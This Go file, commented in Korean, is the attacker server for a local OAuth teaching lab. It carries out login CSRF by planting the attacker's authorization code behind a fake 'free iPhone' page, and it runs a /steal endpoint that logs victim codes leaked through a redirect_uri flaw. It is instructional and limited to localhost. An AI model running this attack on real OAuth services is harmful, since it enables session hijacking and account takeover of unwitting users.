// 공격자 사이트 — :9003
//
// !!! 오직 이 랩의 로컬 서버(:9000~:9002)만 대상으로 한다. !!!
//
// 공격 시나리오: 세션 고정(session fixation) / 로그인 CSRF.
//  1. 공격자(bob)가 먼저 정상 로그인해서 자기 계정의 인가코드를 하나 받아둔다.
//  2. 그 code 가 박힌 링크를 피해자에게 보낸다 (여기서는 페이지의 버튼).
//  3. 피해자가 누르면 피해자 브라우저가 그 code 로 앱의 /callback 을 방문한다.
//  4. 앱은 state 를 확인하지 않으므로, 피해자 세션을 "bob 계정" 에 묶어버린다.
//  5. 피해자는 자기 계정인 줄 알고 메모를 남기지만, 실제로는 bob 의 계정이다.
//     → bob 이 나중에 로그인하면 피해자가 쓴 내용을 전부 본다.
package main

import (
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"net/url"

	"oauth-lab/internal/lab"
	"strings"
	"sync"
)

const (
	selfURL = "http://127.0.0.1:9003"
	asURL   = "http://127.0.0.1:9000"
	appURL  = "http://127.0.0.1:9002"
)

func main() {
	http.HandleFunc("/", handleIndex)
	http.HandleFunc("/steal", handleSteal)
	log.Printf("[EVIL] listening on %s", selfURL)
	log.Fatal(http.ListenAndServe("127.0.0.1:9003", nil))
}

var page = template.Must(template.New("evil").Parse(`<!doctype html>
<meta charset="utf-8"><title>무료 아이폰 당첨!</title>
<style>` + lab.CSS + `.btn{background:#c0202f}</style>
{{.Banner}}
<h1>🎉 무료 아이폰 당첨!</h1>
<p>아래 버튼을 눌러 데모 앱에서 경품을 확인하세요.</p>
{{if .Code}}
  <p><a class="btn" href="{{.AppCallback}}?code={{.Code}}">경품 확인하러 가기 →</a></p>
  <hr>
  <p style="color:#888;font-size:.9rem">공격자(bob) 계정의 인가코드: <code>{{.Code}}</code></p>
{{else}}
  <p style="color:#c00">공격자 code 를 미리 받지 못했습니다. 인가서버(:9000)가 떠 있는지 확인하세요.<br>{{.Err}}</p>
{{end}}
`))

// stolen 은 redirect_uri 취약점으로 새어들어온 code 들을 보관한다 (스텝 4 시연용).
var (
	stolenMu sync.Mutex
	stolen   []string
)

// handleSteal: 등록되지 않은 redirect_uri 로 code 가 여기까지 배달되면 낚아챈다.
func handleSteal(w http.ResponseWriter, r *http.Request) {
	code := r.URL.Query().Get("code")
	if code != "" {
		stolenMu.Lock()
		stolen = append(stolen, code)
		stolenMu.Unlock()
		log.Printf("[EVIL] 🎣 피해자 code 탈취: %s", code)
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	// CSS 안에 % 가 있어 Fprintf 서식으로 해석되지 않도록 문자열을 이어 붙인다.
	fmt.Fprint(w, `<!doctype html><meta charset="utf-8"><title>탈취 성공</title>
<style>`+lab.CSS+`</style>`+
		string(lab.ServerBanner("9003"))+
		`<h1>🎣 code 탈취 성공</h1>
<p>피해자의 인가코드가 공격자 서버에 배달됐습니다.</p>
<pre>`+template.HTMLEscapeString(code)+`</pre>`)
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	code, err := attackerCode()
	data := map[string]any{"AppCallback": appURL + "/callback", "Code": code, "Banner": lab.ServerBanner("9003")}
	if err != nil {
		data["Err"] = err.Error()
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_ = page.Execute(w, data)
}

// attackerCode 는 공격자(bob) 계정으로 정상 로그인해서 인가코드 하나를 받아온다.
// /token 으로 바꾸지 않고 code 단계에서 멈춘다 — 이 code 를 피해자에게 넘길 것이다.
func attackerCode() (string, error) {
	// 302 를 따라가면 안 된다. code 가 실린 Location 헤더 자체가 목적이다.
	noRedirect := &http.Client{CheckRedirect: func(*http.Request, []*http.Request) error {
		return http.ErrUseLastResponse
	}}
	resp, err := noRedirect.PostForm(asURL+"/approve", url.Values{
		"username":     {"bob"},
		"client_id":    {"demo-app"},
		"redirect_uri": {appURL + "/callback"},
		"scope":        {"profile notes:read"},
	})
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, resp.Body)

	loc := resp.Header.Get("Location")
	u, err := url.Parse(loc)
	if err != nil {
		return "", fmt.Errorf("Location 파싱 실패: %s", loc)
	}
	code := u.Query().Get("code")
	if code == "" {
		return "", fmt.Errorf("code 를 못 받음 (Location=%q)", loc)
	}
	return strings.TrimSpace(code), nil
}
